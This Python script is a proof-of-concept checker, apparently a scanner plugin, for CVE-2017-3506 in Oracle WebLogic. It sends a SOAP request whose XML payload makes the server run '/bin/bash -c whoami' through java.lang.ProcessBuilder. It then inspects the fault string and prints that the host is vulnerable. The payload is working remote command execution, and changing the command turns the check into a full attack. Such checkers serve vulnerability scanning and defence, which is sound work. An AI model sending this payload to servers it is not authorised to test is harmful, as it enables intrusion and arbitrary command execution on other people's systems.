# -*- encoding: utf-8 -*-
'''
@Author : aydcyhr
@Contact : aydcyhr@gmail.com
'''

import sys
import requests
import re
from lib import *

VUL=['CVE-2017-3506']
headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:49.0) Gecko/20100101 Firefox/49.0"}

def poc(url,index,rip):
	rurl=url
	if not url.startswith("http"):
		url = "http://" + url
	if "/" in url:
		url += '/wls-wsat/CoordinatorPortType'
	post_str = '''
	<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
	  <soapenv:Header>
		<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
		  <java>
			<object class="java.lang.ProcessBuilder">
			  <array class="java.lang.String" length="3">
				<void index="0">
				  <string>/bin/bash</string>
				</void>
				<void index="1">
				  <string>-c</string>
				</void>
				<void index="2">
				  <string>whoami</string>
				</void>
			  </array>
			  <void method="start"/>
			</object>
		  </java>
		</work:WorkContext>
	  </soapenv:Header>
	  <soapenv:Body/>
	</soapenv:Envelope>
	'''

	try:
		requests.packages.urllib3.disable_warnings()
		response = requests.post(url, data=post_str, verify=False, timeout=5, headers=headers)
		response = response.text
		response = re.search(r"\<faultstring\>.*\<\/faultstring\>", response).group(0)
	except Exception:
		response = ""

	if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
		print(rip +'\t检测存在JAVA deserialization漏洞(CVE-2017-3506)')
		a = rip+":7001:检测存在JAVA deserialization漏洞(CVE-2017-3506)"
		return a
	else:
		pass


def run(rip,rport,index):
	try:
		url=rip+':'+str(rport)
		return poc(url,index,rip)
	except:
		pass